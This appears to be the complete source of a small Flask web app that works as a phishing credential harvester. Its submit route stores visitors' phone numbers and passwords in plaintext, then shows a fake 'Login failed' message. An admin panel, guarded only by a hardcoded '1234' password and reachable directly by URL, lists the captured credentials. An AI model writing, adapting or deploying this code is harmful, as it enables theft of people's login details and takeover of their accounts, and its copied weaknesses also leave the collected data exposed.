from flask import Flask, request, render_template, redirect
import sqlite3

app = Flask(__name__)

DB = 'logins.db'
ADMIN_USERNAME = 'admin'
ADMIN_PASSWORD = '1234'

def insert_login(phone, password):
    conn = sqlite3.connect(DB)
    cursor = conn.cursor()
    cursor.execute("INSERT INTO logins (phone, password) VALUES (?, ?)", (phone, password))
    conn.commit()
    conn.close()

def get_all_logins():
    conn = sqlite3.connect(DB)
    cursor = conn.cursor()
    cursor.execute("SELECT phone, password FROM logins ORDER BY id DESC")
    rows = cursor.fetchall()
    conn.close()
    return rows

@app.route('/')
def index():
    return render_template("index.html")

@app.route('/submit', methods=['POST'])
def submit():
    phone = request.form.get('phone')
    password = request.form.get('password')
    insert_login(phone, password)
    return "<h3>Login failed. Please try again later.</h3>"

@app.route('/admin-login', methods=['GET', 'POST'])
def admin_login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        if username == ADMIN_USERNAME and password == ADMIN_PASSWORD:
            return redirect('/admin-panel')
        else:
            return "<h3>Invalid credentials.</h3>"
    return render_template("admin_login.html")

@app.route('/admin-panel')
def admin_panel():
    logins = get_all_logins()
    return render_template("admin_panel.html", logins=logins)

if __name__ == '__main__':
    app.run(debug=True)